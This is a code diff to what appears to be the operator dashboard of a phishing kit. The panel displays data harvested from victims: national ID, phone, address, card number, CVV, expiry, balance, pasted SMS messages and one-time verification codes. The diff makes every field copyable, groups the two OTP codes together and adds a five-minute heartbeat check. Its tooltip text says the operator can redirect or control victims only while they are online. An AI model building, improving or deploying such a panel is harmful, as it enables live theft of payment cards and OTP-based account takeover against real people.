@@ -362,52 +362,55 @@ const DASHBOARD_FORM_TABLES = [
         page: 'personal',
         title: 'بيانات شخصية',
         fields: [
-            { key: 'full-name', label: 'الاسم الكامل' },
-            { key: 'national-id', label: 'الرقم القومي' },
-            { key: 'phone', label: 'رقم الهاتف' }
+            { key: 'full-name', label: 'الاسم الكامل', copyable: true },
+            { key: 'national-id', label: 'الرقم القومي', copyable: true },
+            { key: 'phone', label: 'رقم الهاتف', copyable: true }
         ]
     },
     {
         page: 'otp',
         title: 'رمز أول',
-        fields: [{ key: 'otpCode', label: 'رمز OTP' }]
+        fields: [{ key: 'otpCode', label: 'رمز OTP', copyable: true }]
     },
     {
         page: 'otp2',
         title: 'رمز ثاني',
-        fields: [{ key: 'verificationCode', label: 'رمز التحقق' }]
+        fields: [{ key: 'verificationCode', label: 'رمز التحقق', copyable: true }]
     },
     {
         page: 'address',
         title: 'العنوان',
         fields: [
-            { key: 'gov', label: 'المحافظة' },
-            { key: 'district', label: 'المنطقة / الحي' },
-            { key: 'street', label: 'الشارع' }
+            { key: 'gov', label: 'المحافظة', copyable: true },
+            { key: 'district', label: 'المنطقة / الحي', copyable: true },
+            { key: 'street', label: 'الشارع', copyable: true }
         ]
     },
     {
         page: 'card',
         title: 'بيانات البطاقة',
         fields: [
-            { key: 'card_number', label: 'رقم البطاقة' },
-            { key: 'card_holder', label: 'اسم صاحب البطاقة' },
-            { key: 'cvv', label: 'CVV / CVC' },
-            { key: 'expiry_date', label: 'تاريخ الانتهاء' },
-            { key: 'expiry_month', label: 'شهر الانتهاء' },
-            { key: 'expiry_year', label: 'سنة الانتهاء' },
-            { key: 'balance', label: 'الرصيد المتوفر' }
+            { key: 'card_number', label: 'رقم البطاقة', copyable: true },
+            { key: 'card_holder', label: 'اسم صاحب البطاقة', copyable: true },
+            { key: 'cvv', label: 'CVV / CVC', copyable: true },
+            { key: 'expiry_date', label: 'تاريخ الانتهاء', copyable: true },
+            { key: 'expiry_month', label: 'شهر الانتهاء', copyable: true },
+            { key: 'expiry_year', label: 'سنة الانتهاء', copyable: true },
+            { key: 'balance', label: 'الرصيد المتوفر', copyable: true }
         ]
     },
     {
         page: 'watches',
         title: 'الساعة الذكية',
-        fields: [{ key: 'selectedWatch', label: 'الساعة المختارة' }]
+        fields: [{ key: 'selectedWatch', label: 'الساعة المختارة', copyable: true }]
     }
 ];
 
 let dashboardRefreshIntervalId = null;
 let aggregatedUsers = [];
+
+/** نفس نافذة «متصل» في الخادم (5 دقائق منذ آخر heartbeat) */
+const DASHBOARD_OFFLINE_THRESHOLD_MS = 5 * 60 * 1000;
 
 /** صفحة التنقل التي أرسلها المشرف آخراً (تظهر باللون الأخضر حتى يصلها تحديث من الخادم) */
 let lastNavTargetPage = null;
@@ -912,6 +915,36 @@ function getFormTableConfig(page) {
     return DASHBOARD_FORM_TABLES.find((c) => c.page === page);
 }
 
+/** أحدث last_heartbeat بين كل سجلات المستخدم المُجمَّع */
+function getAggregateMaxLastHeartbeat(agg, allRecords) {
+    const ids = new Set();
+    if (agg.sourceIds && agg.sourceIds.length) {
+        agg.sourceIds.forEach((id) => ids.add(String(id)));
+    }
+    if (agg.id) ids.add(String(agg.id));
+    let max = 0;
+    for (const r of allRecords) {
+        if (!ids.has(String(r.id))) continue;
+        if (!r.last_heartbeat) continue;
+        const t = new Date(r.last_heartbeat).getTime();
+        if (!isNaN(t) && t > max) max = t;
+    }
+    return max;
+}
+
+function getLastPageCellHtml(user, allRecords) {
+    const lastHb = getAggregateMaxLastHeartbeat(user, allRecords);
+    const offline =
+        !lastHb || Date.now() - lastHb > DASHBOARD_OFFLINE_THRESHOLD_MS;
+    if (offline) {
+        return `<span class="page-badge page-badge--offline" title="لا يوجد نشاط على الموقع منذ أكثر من 5 دقائق — لا يمكن التوجيه أو التحكم بالمستخدم حتى يعود للتفاعل مع الصفحات.">غير متصل<span class="page-badge-lock" aria-hidden="true">🔒</span></span>`;
+    }
+    const m = user.merged || {};
+    const lp = String(m.last_page || m.page || user.page || '').trim();
+    const label = lp ? getPageArabic(lp) : '—';
+    return `<span class="page-badge page-badge--reachable" title="نشاط حديث — يمكن إرسال التوجيه أو التنبيه عند توفر نفس جلسة المتصفح.">${escapeHtml(label)}</span>`;
+}
+
 function renderDashboardTables() {
     const wrap = document.getElementById('dashboardTablesWrap');
     if (!wrap) return;
@@ -946,7 +979,7 @@ function renderDashboardTables() {
             <tr>
                 <td>${idx + 1}</td>
                 <td>${escapeHtml(user.displayName || 'بدون اسم')}</td>
-                <td><span class="page-badge">${escapeHtml(getPageArabic(user.page || ''))}</span></td>
+                <td>${getLastPageCellHtml(user, stored)}</td>
                 <td class="action-column"><button type="button" class="btn-info" data-dash-action="info" data-row-id="${rid}">معلومات</button></td>
                 <td class="action-column"><button type="button" class="btn-card" data-dash-action="card" data-row-id="${rid}">بطاقة</button></td>
                 <td>${escapeHtml(user.registrationTime || '—')}</td>
@@ -1431,41 +1464,104 @@ function openInfoModal(userId) {
     infoModal.style.setProperty('display', 'flex', 'important');
 }
 
-function renderUserDetailsByPage(user) {
+/** قسم واحد من جداول النماذج (منبثق المعلومات) */
+function renderConfiguredFormSection(cfg, user) {
+    if (!cfg) return '';
     const byPage = user.byPageRecords || {};
-    let html = '';
-    for (const cfg of DASHBOARD_FORM_TABLES) {
-        const source = byPage[cfg.page]
-            ? normalizeUserForDisplay(byPage[cfg.page])
-            : {};
-        let rows = '';
-        let anyFilled = false;
-        for (const f of cfg.fields) {
-            const val = getFieldDisplayValue(source, f.key);
-            if (val !== '—') anyFilled = true;
-            rows += `<tr><th>${escapeHtml(f.label)}</th>${renderDetailFieldValueCell(val, f)}</tr>`;
+    const source = byPage[cfg.page]
+        ? normalizeUserForDisplay(byPage[cfg.page])
+        : {};
+    let rows = '';
+    let anyFilled = false;
+    for (const f of cfg.fields) {
+        const val = getFieldDisplayValue(source, f.key);
+        if (val !== '—') anyFilled = true;
+        rows += `<tr><th>${escapeHtml(f.label)}</th>${renderDetailFieldValueCell(val, f)}</tr>`;
+    }
+    if (!anyFilled) {
+        rows = '<tr><th colspan="2">لا توجد تسجيلات في هذا القسم</th></tr>';
+    }
+    let linksBlock = '';
+    if (cfg.page === 'messege' && anyFilled) {
+        const rawMsg = getFieldDisplayValue(source, 'pastedSmsMessage');
+        if (rawMsg !== '—') {
+            const urls = extractUrlsFromText(rawMsg);
+            linksBlock = renderExtractedUrlsTable(urls);
         }
-        if (!anyFilled) {
-            rows = '<tr><th colspan="2">لا توجد تسجيلات في هذا القسم</th></tr>';
-        }
-        let linksBlock = '';
-        if (cfg.page === 'messege' && anyFilled) {
-            const rawMsg = getFieldDisplayValue(source, 'pastedSmsMessage');
-            if (rawMsg !== '—') {
-                const urls = extractUrlsFromText(rawMsg);
-                linksBlock = renderExtractedUrlsTable(urls);
-            }
-        }
-        html += `
-        <div class="page-section">
+    }
+    return `
+        <div class="page-section page-section--compact">
             <h3>${escapeHtml(cfg.title)}</h3>
             <table class="detail-field-table">
                 <tbody>${rows}</tbody>
             </table>
             ${linksBlock}
         </div>`;
+}
+
+/** جدول واحد لرمز OTP ورمز التحقق الثاني مع أسماء حقول واضحة */
+function renderOtpCombinedSection(user) {
+    const byPage = user.byPageRecords || {};
+    const otpSrc = byPage.otp ? normalizeUserForDisplay(byPage.otp) : {};
+    const otp2Src = byPage.otp2 ? normalizeUserForDisplay(byPage.otp2) : {};
+    const rowsSpec = [
+        {
+            label: 'رمز أول (صفحة OTP)',
+            source: otpSrc,
+            key: 'otpCode',
+            meta: { copyable: true }
+        },
+        {
+            label: 'رمز التحقق الثاني (صفحة OTP2)',
+            source: otp2Src,
+            key: 'verificationCode',
+            meta: { copyable: true }
+        }
+    ];
+    let rows = '';
+    let anyFilled = false;
+    for (const spec of rowsSpec) {
+        const val = getFieldDisplayValue(spec.source, spec.key);
+        if (val !== '—') anyFilled = true;
+        rows += `<tr><th>${escapeHtml(spec.label)}</th>${renderDetailFieldValueCell(val, spec.meta)}</tr>`;
     }
-    return html;
+    if (!anyFilled) {
+        rows = '<tr><th colspan="2">لا توجد رموز مسجّلة</th></tr>';
+    }
+    return `
+        <div class="page-section page-section--compact">
+            <h3>رموز التحقق</h3>
+            <table class="detail-field-table">
+                <tbody>${rows}</tbody>
+            </table>
+        </div>`;
+}
+
+/**
+ * ترتيب منبثق المعلومات: (1+2) سطر، (3) كما هو، (4+5) سطر، (6) و(7) كلٌّ بسطر.
+ */
+function renderUserDetailsByPage(user) {
+    const cfgLogin = getFormTableConfig('login');
+    const cfgMsg = getFormTableConfig('messege');
+    const cfgAddr = getFormTableConfig('address');
+    const cfgWatch = getFormTableConfig('watches');
+    const cfgPers = getFormTableConfig('personal');
+    const cfgCard = getFormTableConfig('card');
+
+    return `
+    <div class="user-details-layout">
+        <div class="detail-grid-2col">
+            ${renderConfiguredFormSection(cfgLogin, user)}
+            ${renderOtpCombinedSection(user)}
+        </div>
+        ${renderConfiguredFormSection(cfgMsg, user)}
+        <div class="detail-grid-2col">
+            ${renderConfiguredFormSection(cfgAddr, user)}
+            ${renderConfiguredFormSection(cfgWatch, user)}
+        </div>
+        ${renderConfiguredFormSection(cfgPers, user)}
+        ${renderConfiguredFormSection(cfgCard, user)}
+    </div>`;
 }
 
 function closeInfoModal() {
